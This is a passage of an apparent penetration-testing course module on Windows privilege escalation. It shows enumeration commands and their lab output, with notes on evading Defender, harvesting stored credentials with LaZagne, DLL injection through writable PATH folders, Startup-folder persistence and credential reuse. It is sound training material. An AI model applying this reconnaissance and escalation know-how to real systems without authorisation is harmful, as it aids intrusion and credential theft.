   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .local
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter isatap.{02D6F04C-A625-49D1-A85D-4FB454FBB3DB}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes</code></pre></div><h4 id=arp-table>ARP Table</h4><p>Situational Awareness</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; arp -a

Interface: 10.129.43.8 --- 0x4
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b9-4d-df     dynamic
  10.129.43.12          00-50-56-b9-da-ad     dynamic
  10.129.43.13          00-50-56-b9-5b-9f     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  224.0.0.253           01-00-5e-00-00-fd     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.20.56 --- 0x9
  Internet Address      Physical Address      Type
  192.168.20.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static</code></pre></div><h4 id=routing-table>Routing Table</h4><p>Situational Awareness</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; route print

===========================================================================
Interface List
  9...00 50 56 b9 c5 4b ......vmxnet3 Ethernet Adapter
  4...00 50 56 b9 90 94 ......Intel(R) 82574L Gigabit Network Connection
  1...........................Software Loopback Interface 1
  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
  5...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.129.0.1      10.129.43.8     25
          0.0.0.0          0.0.0.0     192.168.20.1    192.168.20.56    271
       10.129.0.0      255.255.0.0         On-link       10.129.43.8    281
      10.129.43.8  255.255.255.255         On-link       10.129.43.8    281
   10.129.255.255  255.255.255.255         On-link       10.129.43.8    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.20.0    255.255.255.0         On-link     192.168.20.56    271
    192.168.20.56  255.255.255.255         On-link     192.168.20.56    271
   192.168.20.255  255.255.255.255         On-link     192.168.20.56    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link       10.129.43.8    281
        224.0.0.0        240.0.0.0         On-link     192.168.20.56    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link       10.129.43.8    281
  255.255.255.255  255.255.255.255         On-link     192.168.20.56    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0     192.168.20.1  Default
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  4    281 ::/0                     fe80::250:56ff:feb9:4ddf
  1    331 ::1/128                  On-link
  4    281 dead:beef::/64           On-link
  4    281 dead:beef::e4db:5ea3:2775:8d4d/128
                                    On-link
  4    281 fe80::/64                On-link
  9    271 fe80::/64                On-link
  4    281 fe80::e4db:5ea3:2775:8d4d/128
                                    On-link
  9    271 fe80::f055:fefd:b1b:9919/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
  9    271 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None</code></pre></div><p>Â </p><p>Â </p><h4 id=check-windows-defender-status>Check Windows Defender Status</h4><p>Situational Awareness</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :</code></pre></div><h4 id=list-applocker-rules>List AppLocker Rules</h4><p>Situational Awareness</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow</code></pre></div><h4 id=test-applocker-policy>Test AppLocker Policy</h4><p>Situational Awareness</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=initial-enumeration>Initial Enumeration</h1><p>Â </p><p>Â </p><h4 id=tasklist>Tasklist</h4><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
&lt;...SNIP...&gt;

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

&lt;...SNIP...&gt;

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A</code></pre></div><p>Â </p><p>Â </p><p>It is essential to become familiar with standard Windows processes such as <a href=https://en.wikipedia.org/wiki/Session_Manager_Subsystem rel=external>Session Manager Subsystem (smss.exe)</a>, <a href=https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem rel=external>Client Server Runtime Subsystem (csrss.exe)</a>, <a href=https://en.wikipedia.org/wiki/Winlogon rel=external>WinLogon (winlogon.exe)</a>, <a href=https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service rel=external>Local Security Authority Subsystem Service (LSASS)</a>, and <a href=https://en.wikipedia.org/wiki/Svchost.exe rel=external>Service Host (svchost.exe)</a>, among others and the services associated with them. Being able to spot standard processes/services quickly will help speed up our enumeration and enable us to hone in on non-standard processes/services, which may open up a privilege escalation path. In the example above, we would be most interested in the <code>FileZilla</code> FTP server running and would attempt to enumerate the version to look for public vulnerabilities or misconfigurations such as FTP anonymous access, which could lead to sensitive data exposure or more.</p><p>Other processes such as <code>MsMpEng.exe</code>, Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.</p><p>Â </p><p>Â </p><p>Â </p><h4 id=display-all-environment-variables>Display All Environment Variables</h4><p>Â </p><h4 id=display-all-environment-variables-1>Display All Environment Variables</h4><p>The environment variables explain a lot about the host configuration. To get a printout of them, Windows provides the <code>set</code> command. One of the most overlooked variables is <code>PATH</code>. In the output below, nothing is out of the ordinary. However, it is not uncommon to find administrators (or applications) modify the <code>PATH</code>. One common example is to place Python or Java in the path, which would allow the execution of Python or . JAR files. If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.</p><p>In addition to the PATH, <code>set</code> can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed. It is not unheard of to be able to access an &ldquo;IT Directory,&rdquo; which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. (<a href=https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview rel=external>Roaming Profiles</a>). This may also mean the user takes malicious items with them. If a file is placed in <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code>, when the user logs into a different machine, this file will execute.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator</code></pre></div><p>Â </p><p>Â SYSTEMINFO</p><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix" rel=external>HotFixes</a> to get an idea of when the box has been patched. This information isn&rsquo;t always present, as it is possible to hide hotfixes software from non-administrators. The <code>System Boot Time</code> and <code>OS Version</code> can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.</p><p>Additionally, many guides will say the Network Information is important as it could indicate a dual-homed machine (connected to multiple networks). Generally speaking, when it comes to enterprises, devices will just be granted access to other networks via a firewall rule and not have a physical cable run to them.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required</code></pre></div><p>Â </p><p>Â </p><h4 id=patches-and-updates>Patches and Updates</h4><p>If <code>systeminfo</code> doesn&rsquo;t display hotfixes, they may be queriable with <a href=https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page rel=external>WMI</a> using the WMI-Command binary with <a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering rel=external>QFE (Quick Fix Engineering)</a> to display patches.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723</code></pre></div><p>Â </p><p>Â </p><p>We can do this with PowerShell as well using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1" rel=external>Get-Hotfix</a> cmdlet.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=installed-programs>Installed Programs</h4><p>WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is <code>FileZilla</code>/<code>Putty</code>/etc installed? Run <code>LaZagne</code> to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

&lt;SNIP&gt;</code></pre></div><p>We can, of course, d</p><p>We can, of course, do this with PowerShell as well using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1" rel=external>Get-WmiObject</a> cmdlet.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

&lt;SNIP&gt;



Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notmatch &#34;Microsoft&#34; } | Select-Object Name, Version


Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -notmatch &#34;Microsoft|Windows&#34; } | Select-Object Name, Version</code></pre></div><h4 id=display-running-processes>Display Running Processes</h4><p>Â </p><p>Â </p><h4 id=display-running-processes-1>Display Running Processes</h4><p>The <a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat rel=external>netstat</a> command will display active TCP and UDP connections which will give us a better idea of what services are listening on which port(s) both locally and accessible to the outside. We may find a vulnerable service only accessible to the local host (when logged on to the host) that we can exploit to escalate privileges.</p><h4 id=netstat>Netstat</h4><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>PS C:\local&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
&lt;...SNIP...&gt;</code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM</code></pre></div><p>Â </p><p>Â </p><h4 id=current-user-privileges>Current User Privileges</h4><p>As mentioned prior, knowing what privileges our user has can greatly help in escalating privileges. We will look at individual user privileges and escalation paths later in this module.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre></div><p>Â </p><p>Â </p><h4 id=current-user-group-information>Current User Group Information</h4><p>Has our user inherited any rights through their group membership? Are they privileged in the Active Directory domain environment, which could be leveraged to gain access to more systems?</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</code></pre></div><p>Â </p><p>Â </p><h4 id=get-all-users>Get All Users</h4><p>Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user <code>bob</code>, and see a <code>bob_adm</code> user in the local administrators group, it is worth checking for credential re-use. Can we access the user profile directory for any important users? We may find valuable files such as scripts with passwords or SSH keys in a user&rsquo;s Desktop, Documents, or Downloads folder.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 local-student              jordan
sarah                    secsvc
The command completed successfully.</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=get-all-groups>Get All Groups</h4><p>Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.</code></pre></div><p>Â </p><p>Â </p><h4 id=details-about-a-group>Details About a Group</h4><p>It is worth checking out the details for any non-standard groups. Though unlikely, we may find a password or other interesting information stored in the group&rsquo;s description. During our enumeration, we may discover credentials of another non-admin user who is a member of a local group that can be leveraged to escalate privileges.</p><p>Initial Enumeration</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
